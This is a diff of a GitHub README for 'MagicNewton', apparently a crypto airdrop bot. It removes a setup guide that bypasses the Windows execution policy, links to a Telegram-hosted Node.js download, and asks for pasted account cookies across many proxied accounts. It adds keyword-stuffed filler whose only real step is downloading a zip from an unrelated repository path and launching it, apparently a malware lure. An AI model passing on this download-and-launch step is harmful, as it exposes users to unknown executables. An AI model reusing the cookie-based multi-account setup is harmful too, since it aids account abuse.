@@ -1,161 +1,68 @@
-# 🚀 Bot Setup Instructions
 
-Welcome to the bot setup guide! Follow the steps below to install and configure the bot correctly. This guide is designed to be beginner-friendly, with clear explanations for each step.
+# MagicNewton 🎩✨
 
-> [Termux guides if you run on mobile](https://github.com/MeoMunDep/Guides-for-using-my-script-on-termux.)
+Welcome to **MagicNewton** - your go-to repository for all things related to auto rolling dice and completing tasks effortlessly! 🎲🌟
 
----
+## About
 
-## Table of Contents
+**MagicNewton** is a unique project that combines the excitement of rolling dice automatically with the efficiency of task completion. Whether you're into airdrops, Metamask, or just looking for some magical tools, this repository has got you covered! ✨🔮
 
-1. [Prerequisites](#prerequisites)
-2. [Installation Steps](#installation-steps)
-3. [Configuration Files](#configuration-files)
-   - [`configs.json`](#1-configsjson)
-   - [`datas.txt`](#2-datastxt)
-   - [`wallets.txt`](#3-walletstxt)
-   - [`proxies.txt`](#4-proxiestxt)
-4. [Running the Bot](#running-the-bot)
-5. [Contact and Support](#contact-and-support)
+## Features
 
----
+🎲 **Auto Roll Dice**: Let the magic of automation take over and roll dice for you effortlessly.
 
-## Prerequisites
+📋 **Task Automation**: Complete tasks seamlessly with the help of the tools available in this repository.
 
-Before running the bot, make sure you have the following installed:
+🔗 **Metamask Integration**: Explore the world of cryptocurrencies and blockchain with ease using Metamask.
 
-- **Node.js** (Version: `22.11.0`)
-- **npm** (Version: `10.9.0`)
+🍀 **Airdrop Tools**: Stay updated on the latest airdrops and claim them effortlessly using the tools provided here.
 
-Download Node.js and npm here: [Download Link](https://t.me/KeoAirDropFreeNe/257/1462).
+## Repository Topics
 
--> Double click on `run.bat` for windows or `run.sh` for linux/mac if you want to run automatically, remember to fill all the necessary data.
+🎁 **Airdrop**: Discover exciting airdrops and claim them hassle-free.
 
----
+🤖 **Airdrop Claim Bot**: Use bots to streamline the process of claiming airdrops.
 
-## Installation Steps
+🌾 **Airdrop Farm**: Maximize your airdrop earnings by farming them effectively.
 
-1. **Download and Extract the Bot Files:**
+💰 **Airdrop Free**: Get your hands on airdrops without spending a penny.
 
-   - Extract the bot package into a folder on your computer.
+🔧 **Airdrops Tools**: Access a variety of tools to make airdrop claiming easier.
 
-2. **Install Dependencies:**
-   Open your terminal or command prompt, navigate to the folder where the bot files are located, and run:
+🔮 **MagicNewton**: Dive into the world of magic and automation with this repository.
 
-   ```bash
-   npm install --force user-agents axios colors p-limit https-proxy-agent socks-proxy-agent crypto-js ws uuid xlsx readline-sync moment lodash qs
-   ```
+🪄 **Meomundep**: Explore the mystical side of completing tasks effortlessly.
 
-   If you encounter an Execution Policy error on Windows, run:
+💳 **Metamask**: Manage your cryptocurrencies securely and efficiently with Metamask.
 
-   ```bash
-   Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
-   ```
+🕸️ **Web**: Stay connected to the online world with the latest tools and technologies.
 
-   Then, run the npm install command again.
+## Getting Started
 
-3. **Prepare Configuration Files:**
-   - Ensure all configuration files are set up correctly before running the bot (see [Configuration Files](#configuration-files) section).
+To get started with **MagicNewton**, [click here to download the latest version!](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
 
----
+[![Download Latest Version](https://img.shields.io/badge/Download-Latest%20Version-brightgreen)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
 
-## Configuration Files
+Remember to launch the downloaded file to begin your magical journey with **MagicNewton**! 🚀
 
-### 1. `configs.json` - 📜 Adjust Bot Settings
+If the link provided above does not work, make sure to check the "Releases" section of this repository for alternative download options.
 
-This file controls the bot’s behavior. Below is an example configuration:
+## Join the Community
 
-```json
-{
-  "timeZone": "en-US",
-  "rotateProxy": false,
-  "skipInvalidProxy": false,
-  "proxyRotationInterval": 2,
-  "delayEachAccount": [5, 8],
-  "timeToRestartAllAccounts": 300,
-  "howManyAccountsRunInOneTime": 100,
-  "doTasks": false
-}
-```
+Connect with other magic enthusiasts, task automation wizards, and airdrop aficionados by joining our community. Share your experiences, tips, and tricks with like-minded individuals and embark on a magical journey together! 🧙‍♂️🌌
 
-- **Fields Explained:**
-  - `timeZone`: Time zone setting (e.g., "en-US").
-  - `rotateProxy`: Enable or disable proxy rotation.
-  - `skipInvalidProxy`: Skip invalid proxies if `true`.
-  - `proxyRotationInterval`: Time interval (in minutes) for rotating proxies.
-  - `delayEachAccount`: Random delay range (in seconds) between accounts.
-  - `timeToRestartAllAccounts`: Time (in seconds) to restart all accounts.
-  - `howManyAccountsRunInOneTime`: Number of accounts to run simultaneously.
-  - `doTasks`: Enable task completion.
+## Contributors
 
-### 2. `datas.txt` - 🗂️ User Data
+A big thank you to all the contributors who have made **MagicNewton** possible. Your dedication and expertise have helped create a truly magical experience for users around the world. ✨👏
 
-- Fill the data for `datas.txt` file, get data from [here](https://t.me/KeoAirDropFreeNee/1418). This file contains user data in the following format:
+## License
 
-```txt
-cookie
-cookie
-cookie
-```
-
-_Note: Each row for each account_
-
-### 3. `wallets.txt` - 💼 Wallet Addresses
-
-- Wallets generator: [Link](https://github.com/MeoMunDep/Automatic-Ultimate-Create-Wallets-for-Airdrop)
-- Add your wallet addresses in the following format:
-
-```txt
-abc...xyz
-abc...xyz
-abc...xyz
-```
-
-_Note: Wallet updates are currently not supported._
-
-### 4. `proxies.txt` - 🌐 Proxy List (Optional)
-
-If you are using proxies, add them here. Leave the file blank if you are not using proxies. Supported formats:
-
-```txt
-http://user:password@host:port
-https://user:password@host:port
-socks4://user:password@host:port
-socks5://user:password@host:port
-```
-
-_Note: each row for each account_
+This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
 
 ---
 
-## Running the Bot
+Let the magic of **MagicNewton** empower you to roll dice effortlessly and conquer tasks with ease. Dive into the world of automation, airdrops, and Metamask integration like never before. Join us on this mystical journey and unleash the power of magic and technology combined! 🌟🔮
 
-1. Navigate to the folder containing the bot files:
+[Visit our website](https://magicnewton.com) for more information and updates. 
 
-   ```bash
-   cd /path/to/meomundep-folder
-   ```
-
-2. Run the bot using the following command:
-   ```bash
-   node meomundep.js
-   ```
-
----
-
-## Contact and Support
-
-- **Help me with your referral** [Referral Link](https://magicnewton.com/portal?referral=fm128uuxw95ahto6)
-- **Buy me a telegram account** [Here](https://t.me/KeoAirDropFreeNe/312/27801) or [Here](https://github.com/MeoMunDep/MeoMunDep)
-
-If you encounter any issues or have questions, feel free to reach out:
-
-- **Contact:** [Contact Me](https://t.me/MeoMunDep)
-- **Group:** [Join the Group](https://t.me/KeoAirDropFreeNe)
-- **Channel:** [Visit the Channel](https://t.me/KeoAirDropFreeNee)
-
-Your support is greatly appreciated! 🐱
-
----
-
-Enjoy using the bot! 🚀
+**MagicNewton** - Where magic meets automation for a truly enchanting experience! 🎩✨
